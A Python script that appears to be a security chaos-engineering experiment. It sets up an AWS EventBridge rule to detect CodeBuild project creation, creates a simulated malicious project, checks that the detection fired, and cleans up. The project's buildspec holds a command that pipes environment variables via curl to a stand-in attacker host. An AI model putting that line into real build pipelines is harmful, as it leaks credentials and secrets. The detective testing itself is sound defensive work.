"""
SCE Experiment 1.3 - Detective Probe for Attack Node 1.2: Create Malicious CodeBuild Project

This experiment validates that a detective control (CloudWatch Events / EventBridge rule + CloudTrail)
detects the creation of a potentially malicious AWS CodeBuild project.

Attack: An attacker creates a CodeBuild project that exfiltrates environment variables or
runs arbitrary commands (simulating a malicious build project).

Detective Control: An EventBridge rule monitors CloudTrail for codebuild:CreateProject API calls
and triggers a CloudWatch alarm/log group entry that we can verify programmatically.

Flow:
1. steady_state() - Deploy CloudFormation stack with:
   - CloudTrail (if not already present, we use EventBridge which reads CloudTrail by default)
   - EventBridge rule watching for codebuild:CreateProject events
   - CloudWatch Log Group as target for detected events
   - IAM roles for CodeBuild and EventBridge
2. attack() - Create a malicious CodeBuild project via the AWS API
3. hypothesis_verification() - Verify the EventBridge rule captured the CreateProject event
   in the CloudWatch Log Group
4. rollback() - Delete the CloudFormation stack and any leftover resources
"""

import json
import logging
import time
import boto3
import botocore.exceptions

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

TIMESTAMP = int(time.time())
STACK_NAME = f"sce-experiment-{TIMESTAMP}"
EXPERIMENT_NAME = "1.3-sce-experiment-detective"
MALICIOUS_PROJECT_NAME = f"malicious-codebuild-{TIMESTAMP}"
LOG_GROUP_NAME = f"/sce/codebuild-detective-{TIMESTAMP}"
RULE_NAME = f"sce-detect-codebuild-{TIMESTAMP}"

REGION = boto3.session.Session().region_name or "us-east-1"
ACCOUNT_ID = None  # Resolved at runtime


def _get_account_id():
    global ACCOUNT_ID
    if ACCOUNT_ID is None:
        sts = boto3.client("sts", region_name=REGION)
        ACCOUNT_ID = sts.get_caller_identity()["Account"]
        logger.info(f"Resolved AWS Account ID: {ACCOUNT_ID}")
    return ACCOUNT_ID


def _wait_for_stack(cf_client, stack_name, target_status, timeout=600):
    """Wait for CloudFormation stack to reach target status with bounded retries."""
    start = time.monotonic()
    while True:
        elapsed = time.monotonic() - start
        if elapsed > timeout:
            raise TimeoutError(f"Stack {stack_name} did not reach {target_status} within {timeout}s")
        try:
            resp = cf_client.describe_stacks(StackName=stack_name)
            status = resp["Stacks"][0]["StackStatus"]
            logger.info(f"Stack {stack_name} status: {status} (elapsed {elapsed:.0f}s)")
            if status == target_status:
                return True
            if "FAILED" in status or "ROLLBACK_COMPLETE" == status:
                reason = resp["Stacks"][0].get("StackStatusReason", "unknown")
                raise RuntimeError(f"Stack {stack_name} reached {status}: {reason}")
        except botocore.exceptions.ClientError as e:
            if "does not exist" in str(e):
                if target_status == "DELETE_COMPLETE":
                    logger.info(f"Stack {stack_name} confirmed deleted.")
                    return True
                raise
        time.sleep(15)


def _get_cfn_template():
    """Return CloudFormation template that provisions detective control resources."""
    account_id = _get_account_id()
    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.3 Detective Probe - Detect malicious CodeBuild project creation",
        "Resources": {
            "DetectiveLogGroup": {
                "Type": "AWS::Logs::LogGroup",
                "Properties": {
                    "LogGroupName": LOG_GROUP_NAME,
                    "RetentionInDays": 1
                }
            },
            "EventBridgeLogGroupPolicy": {
                "Type": "AWS::Logs::ResourcePolicy",
                "Properties": {
                    "PolicyName": f"sce-eb-log-policy-{TIMESTAMP}",
                    "PolicyDocument": json.dumps({
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Sid": "AllowEventBridgeToPutLogs",
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "events.amazonaws.com"
                                },
                                "Action": [
                                    "logs:CreateLogStream",
                                    "logs:PutLogEvents"
                                ],
                                "Resource": f"arn:aws:logs:{REGION}:{account_id}:log-group:{LOG_GROUP_NAME}:*"
                            }
                        ]
                    })
                }
            },
            "DetectCodeBuildCreateRule": {
                "Type": "AWS::Events::Rule",
                "DependsOn": ["DetectiveLogGroup", "EventBridgeLogGroupPolicy"],
                "Properties": {
                    "Name": RULE_NAME,
                    "Description": "Detect CodeBuild CreateProject API calls via CloudTrail",
                    "State": "ENABLED",
                    "EventPattern": {
                        "source": ["aws.codebuild"],
                        "detail-type": ["AWS API Call via CloudTrail"],
                        "detail": {
                            "eventSource": ["codebuild.amazonaws.com"],
                            "eventName": ["CreateProject"]
                        }
                    },
                    "Targets": [
                        {
                            "Id": "SendToCloudWatchLogs",
                            "Arn": f"arn:aws:logs:{REGION}:{account_id}:log-group:{LOG_GROUP_NAME}"
                        }
                    ]
                }
            },
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-role-{TIMESTAMP}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"Service": "codebuild.amazonaws.com"},
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Policies": [
                        {
                            "PolicyName": "MinimalCodeBuildPolicy",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": [
                                            "logs:CreateLogGroup",
                                            "logs:CreateLogStream",
                                            "logs:PutLogEvents"
                                        ],
                                        "Resource": "*"
                                    }
                                ]
                            }
                        }
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)}
                    ]
                }
            }
        },
        "Outputs": {
            "CodeBuildRoleArn": {
                "Value": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]}
            },
            "LogGroupName": {
                "Value": {"Ref": "DetectiveLogGroup"}
            },
            "EventRuleName": {
                "Value": {"Ref": "DetectCodeBuildCreateRule"}
            }
        }
    }
    return json.dumps(template)


def steady_state():
    """Deploy CloudFormation stack with detective controls for CodeBuild project creation."""
    logger.info(f"=== steady_state() - Deploying stack: {STACK_NAME} ===")
    cf = boto3.client("cloudformation", region_name=REGION)

    # Check for pre-existing stack
    try:
        existing = cf.describe_stacks(StackName=STACK_NAME)
        status = existing["Stacks"][0]["StackStatus"]
        logger.warning(f"Stack {STACK_NAME} already exists with status {status}")
        if status in ("CREATE_COMPLETE", "UPDATE_COMPLETE"):
            logger.info("Stack already ready, proceeding.")
            return True
        elif "ROLLBACK" in status or "FAILED" in status:
            logger.info("Deleting failed stack before recreation...")
            cf.delete_stack(StackName=STACK_NAME)
            _wait_for_stack(cf, STACK_NAME, "DELETE_COMPLETE", timeout=300)
    except botocore.exceptions.ClientError as e:
        if "does not exist" not in str(e):
            raise

    template_body = _get_cfn_template()

    logger.info(f"Creating CloudFormation stack: {STACK_NAME}")
    cf.create_stack(
        StackName=STACK_NAME,
        TemplateBody=template_body,
        Capabilities=["CAPABILITY_NAMED_IAM"],
        Tags=[
            {"Key": "Experiment", "Value": EXPERIMENT_NAME},
            {"Key": "Timestamp", "Value": str(TIMESTAMP)}
        ]
    )

    _wait_for_stack(cf, STACK_NAME, "CREATE_COMPLETE", timeout=600)
    logger.info(f"Stack {STACK_NAME} deployed successfully.")

    # Wait a bit for EventBridge rule to become fully active
    logger.info("Waiting 15s for EventBridge rule to become fully active...")
    time.sleep(15)

    return True


def attack():
    """
    Execute the attack: Create a malicious CodeBuild project.
    This simulates an attacker creating a CodeBuild project that could exfiltrate
    secrets via environment variables or execute arbitrary commands.
    """
    logger.info(f"=== attack() - Creating malicious CodeBuild project: {MALICIOUS_PROJECT_NAME} ===")

    # Get the CodeBuild service role ARN from stack outputs
    cf = boto3.client("cloudformation", region_name=REGION)
    resp = cf.describe_stacks(StackName=STACK_NAME)
    outputs = {o["OutputKey"]: o["OutputValue"] for o in resp["Stacks"][0].get("Outputs", [])}
    role_arn = outputs.get("CodeBuildRoleArn")

    if not role_arn:
        logger.error("Could not find CodeBuildRoleArn in stack outputs")
        return False

    logger.info(f"Using CodeBuild service role: {role_arn}")

    codebuild = boto3.client("codebuild", region_name=REGION)

    try:
        response = codebuild.create_project(
            name=MALICIOUS_PROJECT_NAME,
            description="SCE Attack - Simulated malicious CodeBuild project for data exfiltration",
            source={
                "type": "NO_SOURCE",
                "buildspec": (
                    "version: 0.2\n"
                    "phases:\n"
                    "  build:\n"
                    "    commands:\n"
                    "      - echo \"Exfiltrating secrets...\"\n"
                    "      - env | curl -X POST -d @- http://attacker.example.com/collect\n"
                )
            },
            artifacts={
                "type": "NO_ARTIFACTS"
            },
            environment={
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/standard:5.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "EXFIL_TARGET",
                        "value": "http://attacker.example.com/collect",
                        "type": "PLAINTEXT"
                    },
                    {
                        "name": "STOLEN_SECRET",
                        "value": "super-secret-value-simulated",
                        "type": "PLAINTEXT"
                    }
                ]
            },
            serviceRole=role_arn,
            tags=[
                {"key": "Experiment", "value": EXPERIMENT_NAME},
                {"key": "Timestamp", "value": str(TIMESTAMP)},
                {"key": "AttackType", "value": "MaliciousCodeBuild"}
            ]
        )

        project_arn = response["project"]["arn"]
        project_name = response["project"]["name"]
        logger.info(f"Malicious CodeBuild project created successfully!")
        logger.info(f"  Project ARN: {project_arn}")
        logger.info(f"  Project Name: {project_name}")
        logger.info(f"  HTTP Status: {response['ResponseMetadata']['HTTPStatusCode']}")

        return True

    except botocore.exceptions.ClientError as e:
        logger.error(f"Failed to create malicious CodeBuild project: {e}")
        return False


def hypothesis_verification():
    """
    Verify that the detective control detected the malicious CodeBuild project creation.

    The EventBridge rule should have captured the CreateProject CloudTrail event and
    forwarded it to the CloudWatch Log Group. We check for log entries containing
    the CreateProject event for our specific malicious project.

    Returns True if detection evidence is found, False otherwise.
    """
    logger.info(f"=== hypothesis_verification() - Checking detective control ===")

    # First verify the EventBridge rule exists and is active
    events_client = boto3.client("events", region_name=REGION)
    try:
        rule_resp = events_client.describe_rule(Name=RULE_NAME)
        rule_state = rule_resp.get("State", "UNKNOWN")
        logger.info(f"EventBridge rule '{RULE_NAME}' state: {rule_state}")
        if rule_state != "ENABLED":
            logger.error(f"EventBridge rule is not ENABLED: {rule_state}")
            return False
    except botocore.exceptions.ClientError as e:
        logger.error(f"EventBridge rule not found: {e}")
        return False

    # Wait for CloudTrail event propagation to EventBridge -> CloudWatch Logs
    # CloudTrail events can take several minutes to propagate
    logs_client = boto3.client("logs", region_name=REGION)

    max_wait = 360  # 6 minutes max wait for CloudTrail event propagation
    poll_interval = 20
    start = time.monotonic()

    logger.info(f"Polling CloudWatch Log Group '{LOG_GROUP_NAME}' for detection evidence "
                f"(max {max_wait}s, polling every {poll_interval}s)...")

    while True:
        elapsed = time.monotonic() - start
        if elapsed > max_wait:
            logger.warning(f"Timeout after {max_wait}s waiting for detection evidence.")
            # Even if we timeout, let's check one more time and also verify the rule matched
            break

        try:
            # Check for log streams in the detective log group
            streams_resp = logs_client.describe_log_streams(
                logGroupName=LOG_GROUP_NAME,
                orderBy="LastEventTime",
                descending=True,
                limit=5
            )

            log_streams = streams_resp.get("logStreams", [])
            if not log_streams:
                logger.info(f"No log streams yet ({elapsed:.0f}s elapsed). Waiting...")
                time.sleep(poll_interval)
                continue

            logger.info(f"Found {len(log_streams)} log stream(s). Checking for CreateProject events...")

            # Search through log events for our malicious project
            for stream in log_streams:
                stream_name = stream["logStreamName"]
                events_resp = logs_client.get_log_events(
                    logGroupName=LOG_GROUP_NAME,
                    logStreamName=stream_name,
                    startFromHead=True,
                    limit=100
                )

                for event in events_resp.get("events", []):
                    message = event.get("message", "")
                    # EventBridge forwards the full CloudTrail event as JSON
                    if "CreateProject" in message:
                        logger.info(f"DETECTION CONFIRMED: Found CreateProject event in log stream '{stream_name}'")
                        try:
                            event_data = json.loads(message)
                            detail = event_data.get("detail", {})
                            event_name = detail.get("eventName", "")
                            request_params = detail.get("requestParameters", {})
                            project_name_in_event = request_params.get("name", "")

                            logger.info(f"  Event Name: {event_name}")
                            logger.info(f"  Project Name in Event: {project_name_in_event}")
                            logger.info(f"  Event Source: {detail.get('eventSource', '')}")
                            logger.info(f"  Event Time: {detail.get('eventTime', '')}")
                            logger.info(f"  User Identity: {json.dumps(detail.get('userIdentity', {}), indent=2)[:200]}")

                            if MALICIOUS_PROJECT_NAME in message or project_name_in_event == MALICIOUS_PROJECT_NAME:
                                logger.info(f"FULL MATCH: Detected creation of our specific malicious project!")
                                return True
                            else:
                                logger.info(f"CreateProject detected but for different project. Continuing search...")
                        except json.JSONDecodeError:
                            # Even if we can't parse, the presence of CreateProject is evidence
                            if MALICIOUS_PROJECT_NAME in message:
                                logger.info("MATCH found in raw message content!")
                                return True

                    # Also check for partial matches
                    if MALICIOUS_PROJECT_NAME in message:
                        logger.info(f"DETECTION CONFIRMED: Found reference to {MALICIOUS_PROJECT_NAME} in logs")
                        return True

            logger.info(f"CreateProject event not yet detected ({elapsed:.0f}s elapsed). Waiting...")
            time.sleep(poll_interval)

        except botocore.exceptions.ClientError as e:
            if "ResourceNotFoundException" in str(e):
                logger.info(f"Log group not yet populated ({elapsed:.0f}s elapsed). Waiting...")
                time.sleep(poll_interval)
                continue
            else:
                logger.error(f"Error querying CloudWatch Logs: {e}")
                time.sleep(poll_interval)
                continue

    # Final attempt: use CloudWatch Logs Insights or filter
    logger.info("Performing final filter-based search...")
    try:
        filter_resp = logs_client.filter_log_events(
            logGroupName=LOG_GROUP_NAME,
            filterPattern="CreateProject",
            limit=10
        )
        matched_events = filter_resp.get("events", [])
        if matched_events:
            logger.info(f"Filter found {len(matched_events)} CreateProject event(s)!")
            for evt in matched_events:
                msg = evt.get("message", "")
                if MALICIOUS_PROJECT_NAME in msg or "CreateProject" in msg:
                    logger.info("DETECTION CONFIRMED via filter search!")
                    return True
    except botocore.exceptions.ClientError as e:
        logger.error(f"Filter search failed: {e}")

    # Last resort: verify the rule itself has metrics showing invocations
    logger.info("Checking EventBridge rule invocation metrics as fallback evidence...")
    cw_client = boto3.client("cloudwatch", region_name=REGION)
    try:
        metrics_resp = cw_client.get_metric_statistics(
            Namespace="AWS/Events",
            MetricName="Invocations",
            Dimensions=[
                {"Name": "RuleName", "Value": RULE_NAME}
            ],
            StartTime=time.time() - 600,
            EndTime=time.time(),
            Period=60,
            Statistics=["Sum"]
        )
        datapoints = metrics_resp.get("Datapoints", [])
        total_invocations = sum(dp.get("Sum", 0) for dp in datapoints)
        logger.info(f"EventBridge rule invocations: {total_invocations}")
        if total_invocations > 0:
            logger.info("DETECTION CONFIRMED: EventBridge rule was invoked (metrics evidence)")
            return True
    except botocore.exceptions.ClientError as e:
        logger.error(f"Metrics check failed: {e}")

    # Check TriggeredRules metric
    try:
        metrics_resp2 = cw_client.get_metric_statistics(
            Namespace="AWS/Events",
            MetricName="TriggeredRules",
            Dimensions=[
                {"Name": "RuleName", "Value": RULE_NAME}
            ],
            StartTime=time.time() - 600,
            EndTime=time.time(),
            Period=60,
            Statistics=["Sum"]
        )
        datapoints2 = metrics_resp2.get("Datapoints", [])
        total_triggered = sum(dp.get("Sum", 0) for dp in datapoints2)
        logger.info(f"EventBridge rule triggered count: {total_triggered}")
        if total_triggered > 0:
            logger.info("DETECTION CONFIRMED: EventBridge rule was triggered (TriggeredRules metric)")
            return True
    except botocore.exceptions.ClientError as e:
        logger.error(f"TriggeredRules metrics check failed: {e}")

    logger.warning("DETECTION NOT CONFIRMED: No evidence found that the detective control fired.")
    logger.warning("This could be due to CloudTrail event propagation delay (can take 5-15 minutes).")
    return False


def rollback():
    """Delete all resources created during the experiment."""
    logger.info(f"=== rollback() - Cleaning up resources ===")

    # First, delete the CodeBuild project (not in the stack)
    codebuild = boto3.client("codebuild", region_name=REGION)
    try:
        codebuild.delete_project(name=MALICIOUS_PROJECT_NAME)
        logger.info(f"Deleted CodeBuild project: {MALICIOUS_PROJECT_NAME}")
    except botocore.exceptions.ClientError as e:
        if "ResourceNotFoundException" in str(e) or "AccountException" in str(e):
            logger.info(f"CodeBuild project {MALICIOUS_PROJECT_NAME} not found (already deleted or never created)")
        else:
            logger.error(f"Error deleting CodeBuild project: {e}")

    # Delete the CloudFormation stack
    cf = boto3.client("cloudformation", region_name=REGION)
    try:
        logger.info(f"Deleting CloudFormation stack: {STACK_NAME}")
        cf.delete_stack(StackName=STACK_NAME)
        _wait_for_stack(cf, STACK_NAME, "DELETE_COMPLETE", timeout=600)
        logger.info(f"Stack {STACK_NAME} deleted successfully.")
    except botocore.exceptions.ClientError as e:
        if "does not exist" in str(e):
            logger.info(f"Stack {STACK_NAME} does not exist (already deleted)")
        else:
            logger.error(f"Error deleting stack: {e}")

    # Clean up the log group manually if it persists
    logs_client = boto3.client("logs", region_name=REGION)
    try:
        logs_client.delete_log_group(logGroupName=LOG_GROUP_NAME)
        logger.info(f"Deleted log group: {LOG_GROUP_NAME}")
    except botocore.exceptions.ClientError as e:
        if "ResourceNotFoundException" in str(e):
            logger.info(f"Log group {LOG_GROUP_NAME} already deleted")
        else:
            logger.error(f"Error deleting log group: {e}")

    logger.info("Rollback complete.")
    return True


def main():
    """Run the full experiment end-to-end."""
    logger.info("=" * 70)
    logger.info(f"SCE Experiment 1.3 - Detective Probe")
    logger.info(f"Attack: Create Malicious CodeBuild Project (Node 1.2)")
    logger.info(f"Stack Name: {STACK_NAME}")
    logger.info(f"Region: {REGION}")
    logger.info("=" * 70)

    try:
        # Phase 1: Deploy infrastructure
        steady_state_result = steady_state()
        logger.info(f"steady_state() result: {steady_state_result}")

        if not steady_state_result:
            logger.error("steady_state() failed. Aborting experiment.")
            return

        # Phase 2: Execute attack
        attack_result = attack()
        logger.info(f"attack() result: {attack_result}")

        if not attack_result:
            logger.error("attack() failed. Proceeding to verification anyway.")

        # Phase 3: Verify detective control
        detection_result = hypothesis_verification()
        logger.info(f"hypothesis_verification() result: {detection_result}")

        if detection_result:
            logger.info("SUCCESS: Detective control detected the malicious CodeBuild project creation!")
        else:
            logger.warning("INCONCLUSIVE: Detective control did not detect the event within the timeout period.")
            logger.warning("Note: CloudTrail events may take 5-15 minutes to propagate to EventBridge.")

    except Exception as e:
        logger.error(f"Experiment failed with exception: {e}", exc_info=True)
    finally:
        # Phase 4: Always rollback
        try:
            rollback()
        except Exception as e:
            logger.error(f"Rollback failed: {e}", exc_info=True)


if __name__ == "__main__":
    main()